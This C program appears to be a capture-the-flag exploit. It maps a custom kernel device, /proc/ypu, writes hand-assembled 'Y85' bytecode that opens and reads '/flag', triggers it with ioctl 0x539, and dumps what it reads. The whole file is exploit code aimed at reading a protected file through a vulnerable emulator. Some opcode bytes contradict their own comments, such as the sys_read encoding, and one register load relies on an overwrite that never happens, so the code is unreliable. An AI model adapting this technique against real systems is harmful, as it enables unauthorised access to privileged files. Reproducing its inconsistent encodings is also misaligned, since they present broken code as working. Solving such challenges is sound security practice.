#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>

int fd;
volatile char *shared_buffer;

void build_flag_exploit() {
    printf("\n=== Building Flag Exploit ===\n");
    
    uint32_t magic = 0x595055;
    memset((void*)shared_buffer, 0, 0x100000);

    // Write "/flag" string to data memory (page 1 of user memory)
    volatile uint8_t *data_mem = (volatile uint8_t*)(shared_buffer + 0x1000);
    strcpy((char*)(data_mem + 0x50), "/flag");
    printf("Flag path written: '/flag' at data offset 0x50\n");

    uint32_t *header = (uint32_t*)shared_buffer;
    header[0] = magic;
    header[1] = 0x10;  // Entry point offset

    uint8_t *code = (uint8_t*)(shared_buffer + 0x10);
    memset(code, 0, 0x100);
    
    int pc = 0;
    
    // Set data segment to 1 (points to user data area)
    code[pc++] = 0x20;  // IMM ds, 1
    code[pc++] = 0x08;  // ds register
    code[pc++] = 0x01;  // value 1
    
    // Load filename address into A (0x50 points to "/flag")
    code[pc++] = 0x20;  // IMM a, 0x50
    code[pc++] = 0x00;  // a register  
    code[pc++] = 0x50;  // address of "/flag" string
    
    // Load flags into B (O_RDONLY = 0)
    code[pc++] = 0x20;  // IMM b, 0
    code[pc++] = 0x01;  // b register
    code[pc++] = 0x00;  // O_RDONLY
    
    // Load mode into C (0)
    code[pc++] = 0x20;  // IMM c, 0
    code[pc++] = 0x02;  // c register
    code[pc++] = 0x00;  // mode 0
    
    // sys_open call - stores result in register d
    code[pc++] = 0x0C;  // SYS instruction with 0x800 flag
    code[pc++] = 0x08;  // high byte: 0x0800 >> 8 = 0x08
    code[pc++] = 0x03;  // store result in d register
    
    // Now read from the opened file
    // A should contain the fd (move d to a)
    code[pc++] = 0x20;  // IMM a, (we'll use the fd from d)
    code[pc++] = 0x00;  // a register
    code[pc++] = 0x00;  // will be overwritten by fd value
    
    // Set read buffer address in B (0x60 in data memory)
    code[pc++] = 0x20;  // IMM b, 0x60
    code[pc++] = 0x01;  // b register
    code[pc++] = 0x60;  // buffer address
    
    // Set read count in C (64 bytes)
    code[pc++] = 0x20;  // IMM c, 64
    code[pc++] = 0x02;  // c register
    code[pc++] = 0x40;  // 64 bytes
    
    // Copy fd from d to a register (using stack operations)
    code[pc++] = 0x40;  // STK - push d to stack
    code[pc++] = 0x03;  // push d
    code[pc++] = 0x00;  // padding
    
    code[pc++] = 0x40;  // STK - pop to a
    code[pc++] = 0x00;  // pop to a
    code[pc++] = 0x00;  // padding
    
    // sys_read call
    code[pc++] = 0x24;  // SYS instruction with 0x2000 flag  
    code[pc++] = 0x00;  // high byte: 0x2000 >> 8 = 0x20, but we need bit encoding
    code[pc++] = 0x03;  // store result in d register
    
    // Exit
    code[pc++] = 0x20;  // IMM i, 0xff (exit)
    code[pc++] = 0x05;  // i register
    code[pc++] = 0xff;  // exit value
    
    printf("Y85 program built, executing...\n");
    
    errno = 0;
    int result = ioctl(fd, 0x539, 0);
    printf("ioctl result: %d, errno: %d (%s)\n", result, errno, strerror(errno));
    
    // Check if flag was read
    printf("\nChecking for flag content in data memory:\n");
    for (int i = 0x60; i < 0x60 + 64; i++) {
        uint8_t val = data_mem[i];
        if (val >= 0x20 && val <= 0x7e) {  // printable ASCII
            printf("%c", val);
        } else if (val != 0) {
            printf("\\x%02x", val);
        }
    }
    printf("\n");
    
    // Hex dump of the area
    printf("\nHex dump of read buffer (0x60-0x9f):\n");
    for (int i = 0x60; i < 0xa0; i += 16) {
        printf("%02x: ", i);
        for (int j = 0; j < 16 && i + j < 0xa0; j++) {
            printf("%02x ", data_mem[i + j]);
        }
        printf("\n");
    }
}

int main() {
    printf("Y85 Flag Reader\n");
    printf("===============\n");

    fd = open("/proc/ypu", O_RDWR);
    if (fd < 0) {
        perror("open /proc/ypu");
        return 1;
    }

    shared_buffer = mmap(NULL, 256 * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (shared_buffer == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    printf("Mapped shared buffer at %p\n", shared_buffer);
    
    build_flag_exploit();

    munmap((void*)shared_buffer, 256 * 0x1000);
    close(fd);
    return 0;
}
